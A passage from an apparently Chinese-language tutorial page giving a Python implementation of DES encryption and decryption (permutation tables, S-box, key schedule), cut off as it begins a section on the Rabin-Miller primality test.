PC_2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>
        <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span>
        <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span>
        <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span>
        <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span>

<span class="token comment"># 密钥位移</span>
LS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> tools
<span class="token keyword">import</span> binascii
<span class="token keyword">from</span> desMatrix <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">strToHex</span><span class="token punctuation">(</span>str_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    将str型数据转换成16进制字符串
    :param str_text: str
    :return: hex
    """</span>
    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>str_text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">hexToBin</span><span class="token punctuation">(</span>hex_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    将hex型数据转换成2进制的字符串
    :param hex_text: hex
    :return: bin
    """</span>
    bin_text <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> hex_text<span class="token punctuation">:</span>
        text_ord <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
        bin_text <span class="token operator">+=</span> decToBinStr<span class="token punctuation">(</span>text_ord<span class="token punctuation">)</span>
    <span class="token comment"># 将text与key补全，使长度其为64整数倍</span>
    hex_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span>
    <span class="token keyword">if</span> hex_len <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        bin_text <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> hex_len<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>
    <span class="token keyword">return</span> bin_text

<span class="token keyword">def</span> <span class="token function">decToBinStr</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> lens<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    将10进制转为2进制字符串
    :param d: dec num "1"
    :param lens:
    :return: bin num "0001"
    """</span>
    bin_text <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>lens<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bin_text <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>d <span class="token operator">>></span> i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> bin_text
    <span class="token keyword">return</span> bin_text

<span class="token keyword">def</span> <span class="token function">binToHex</span><span class="token punctuation">(</span>bin_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    将2进制字符串转为hex型字符串
    :param bin_text: bin
    :return: hex
    """</span>
    bin_num <span class="token operator">=</span> bin_text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bin_num<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

<span class="token comment"># 明文密文置换部分</span>
<span class="token keyword">def</span> <span class="token function">ipChange</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    IP盒处理
    :param bin_str: 64bit
    :return: 64bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> IP<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> bin_str<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">fpChange</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    末置换
    :param bin_str: 64bit
    :return: 64bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> FP<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> bin_str<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">eChange</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    E-Box置换
    :param bin_str: 32bit
    :return: 48bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> E_Box<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> bin_str<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">str_xor</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    异或
    :param text: 48bit
    :param key: 48bit
    :return: 48bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        xor_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> xor_num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token string">'1'</span>
        <span class="token keyword">if</span> xor_num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token string">'0'</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">sChange</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    S-Box置换
    :param bin_str: 48bit
    :return: 32bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    c <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        run_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>
        row <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>run_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> run_str<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
        col <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>run_str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>S_Box<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span>row <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> col<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            num <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> num
        res <span class="token operator">+=</span> num
        c <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">pChange</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    P-Box置换
    :param bin_str: 64bit
    :return: 64bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> P_Box<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> bin_str<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token comment"># 密钥处理部分</span>
<span class="token keyword">def</span> <span class="token function">pc1_Change</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    密钥PC-1置换
    :param key: 64bit
    :return: 56bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> PC_1<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> key<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">leftShift</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    循环左移
    :param sub_key: 28bit
    :param num: turn
    :return: 28bit
    """</span>
    res <span class="token operator">=</span> sub_key<span class="token punctuation">[</span>num<span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">)</span><span class="token punctuation">]</span>
    res <span class="token operator">=</span> res <span class="token operator">+</span> sub_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>num<span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">pc2_Change</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    密钥PC-2置换
    :param key: 56bit
    :return: 48bit
    """</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> PC_2<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> key<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">function_f</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    将E-Box,xor,S-Box,P-Box的运算封装在一起
    :param bin_str: 32bit
    :param key: 48bit
    :return: 32bit
    """</span>
    first_str <span class="token operator">=</span> eChange<span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span>  <span class="token comment"># E-Box 32bit->48bit</span>
    second_str <span class="token operator">=</span> str_xor<span class="token punctuation">(</span>first_str<span class="token punctuation">,</span> key<span class="token punctuation">)</span>  <span class="token comment"># xor</span>
    third_str <span class="token operator">=</span> sChange<span class="token punctuation">(</span>second_str<span class="token punctuation">)</span>  <span class="token comment"># S-Box 48bit->32bit</span>
    final_str <span class="token operator">=</span> pChange<span class="token punctuation">(</span>third_str<span class="token punctuation">)</span>  <span class="token comment"># P-Box 32bit</span>
    <span class="token keyword">return</span> final_str

<span class="token keyword">def</span> <span class="token function">gen_key</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    生成子密钥
    :param key: 64bit
    :return: 48bit * 16
    """</span>
    key_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    first_change <span class="token operator">=</span> pc1_Change<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment"># 56bit</span>
    key_C0 <span class="token operator">=</span> first_change<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span>  <span class="token comment"># 28bit</span>
    key_D0 <span class="token operator">=</span> first_change<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> LS<span class="token punctuation">:</span>
        key_Ci <span class="token operator">=</span> leftShift<span class="token punctuation">(</span>key_C0<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
        key_Di <span class="token operator">=</span> leftShift<span class="token punctuation">(</span>key_D0<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
        second_change <span class="token operator">=</span> pc2_Change<span class="token punctuation">(</span>key_Ci <span class="token operator">+</span> key_Di<span class="token punctuation">)</span>  <span class="token comment"># 48bit</span>
        key_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>second_change<span class="token punctuation">)</span>
    <span class="token keyword">return</span> key_list

<span class="token keyword">def</span> <span class="token function">encryptPart</span><span class="token punctuation">(</span>bin_plain<span class="token punctuation">,</span> bin_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    加密主要算法
    :param bin_plain: 64bit
    :param bin_key: 64bit
    :return: 64bit
    """</span>
    ip_str <span class="token operator">=</span> ipChange<span class="token punctuation">(</span>bin_plain<span class="token punctuation">)</span>  <span class="token comment"># ip初始置换</span>
    key_list <span class="token operator">=</span> gen_key<span class="token punctuation">(</span>bin_key<span class="token punctuation">)</span>  <span class="token comment"># 生成子密钥</span>
    plain_left <span class="token operator">=</span> ip_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>
    plain_right <span class="token operator">=</span> ip_str<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

    <span class="token comment"># 进行前15次轮换</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp_right <span class="token operator">=</span> plain_right
        f_res <span class="token operator">=</span> function_f<span class="token punctuation">(</span>tmp_right<span class="token punctuation">,</span> key_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        plain_right <span class="token operator">=</span> str_xor<span class="token punctuation">(</span>f_res<span class="token punctuation">,</span> plain_left<span class="token punctuation">)</span>
        plain_left <span class="token operator">=</span> tmp_right
    <span class="token comment"># 第16次轮换</span>
    f_res <span class="token operator">=</span> function_f<span class="token punctuation">(</span>plain_right<span class="token punctuation">,</span> key_list<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    fin_left <span class="token operator">=</span> str_xor<span class="token punctuation">(</span>plain_left<span class="token punctuation">,</span> f_res<span class="token punctuation">)</span>
    fin_right <span class="token operator">=</span> plain_right
    fin_str <span class="token operator">=</span> fpChange<span class="token punctuation">(</span>fin_left <span class="token operator">+</span> fin_right<span class="token punctuation">)</span>  <span class="token comment"># 末置换</span>
    <span class="token keyword">return</span> fin_str

<span class="token keyword">def</span> <span class="token function">decryptPart</span><span class="token punctuation">(</span>bin_cipher<span class="token punctuation">,</span> bin_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    解密函数主体部分，同加密算法，注意密钥是反序的
    :param bin_cipher: 64bit
    :param bin_key: 64bit
    :return: 64bit
    """</span>
    ip_str <span class="token operator">=</span> ipChange<span class="token punctuation">(</span>bin_cipher<span class="token punctuation">)</span>
    key_list <span class="token operator">=</span> gen_key<span class="token punctuation">(</span>bin_key<span class="token punctuation">)</span>
    cipher_left <span class="token operator">=</span> ip_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>
    cipher_right <span class="token operator">=</span> ip_str<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token number">15</span> <span class="token operator">-</span> i  <span class="token comment"># 从第16个子密钥开始轮换</span>
        tmp_right <span class="token operator">=</span> cipher_right
        f_res <span class="token operator">=</span> function_f<span class="token punctuation">(</span>cipher_right<span class="token punctuation">,</span> key_list<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
        cipher_right <span class="token operator">=</span> str_xor<span class="token punctuation">(</span>cipher_left<span class="token punctuation">,</span> f_res<span class="token punctuation">)</span>
        cipher_left <span class="token operator">=</span> tmp_right

    f_res <span class="token operator">=</span> function_f<span class="token punctuation">(</span>cipher_right<span class="token punctuation">,</span> key_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    fin_left <span class="token operator">=</span> str_xor<span class="token punctuation">(</span>cipher_left<span class="token punctuation">,</span> f_res<span class="token punctuation">)</span>
    fin_right <span class="token operator">=</span> cipher_right
    fin_str <span class="token operator">=</span> fpChange<span class="token punctuation">(</span>fin_left <span class="token operator">+</span> fin_right<span class="token punctuation">)</span>
    <span class="token keyword">return</span> fin_str

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    加密函数入口，主要作用是将明文和密钥转为64倍数位的2进制bit流
    :param plaintext:
    :param key:
    :return: 16进制密文
    """</span>
    bin_plain <span class="token operator">=</span> hexToBin<span class="token punctuation">(</span>strToHex<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 获得明文的64倍数位bit流</span>
    bin_key <span class="token operator">=</span> hexToBin<span class="token punctuation">(</span>strToHex<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 获得密钥的64倍数位bit流</span>
    tmp <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'.&#123;64&#125;'</span><span class="token punctuation">,</span> bin_plain<span class="token punctuation">)</span>  <span class="token comment"># 将明文bit流分为64一组</span>
    bin_cipher <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>
        bin_cipher <span class="token operator">+=</span> encryptPart<span class="token punctuation">(</span>i<span class="token punctuation">,</span> bin_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 对每组bit流进行加密</span>
    <span class="token keyword">return</span> binToHex<span class="token punctuation">(</span>bin_cipher<span class="token punctuation">)</span>  <span class="token comment"># 返回16进制密文</span>

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    基本上同加密算法，不同的是首先需要对输入进行检查
    """</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        bin_cipher <span class="token operator">=</span> hexToBin<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        bin_key <span class="token operator">=</span> hexToBin<span class="token punctuation">(</span>strToHex<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
        tmp <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'.&#123;64&#125;'</span><span class="token punctuation">,</span> bin_cipher<span class="token punctuation">)</span>
        bin_plain <span class="token operator">=</span> <span class="token string">""</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>
            bin_plain <span class="token operator">+=</span> decryptPart<span class="token punctuation">(</span>i<span class="token punctuation">,</span> bin_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> tools<span class="token punctuation">.</span>bytesToLong<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bin_plain<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> <span class="token string">"123456789 asd 加解密"</span>
    k <span class="token operator">=</span> <span class="token string">"123Des密码"</span>
    c <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    d <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h1><p>RSA相关的之前已经有了，这里主要是素性检验算法 RabinMiller 算法</p>
<h2 id="RabinMiller-算法"><a href="#RabinMiller-算法" class="headerlink" title="RabinMiller 算法"></a>RabinMiller 算法</h2><p>RabinMiller主要是用于检测素数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random

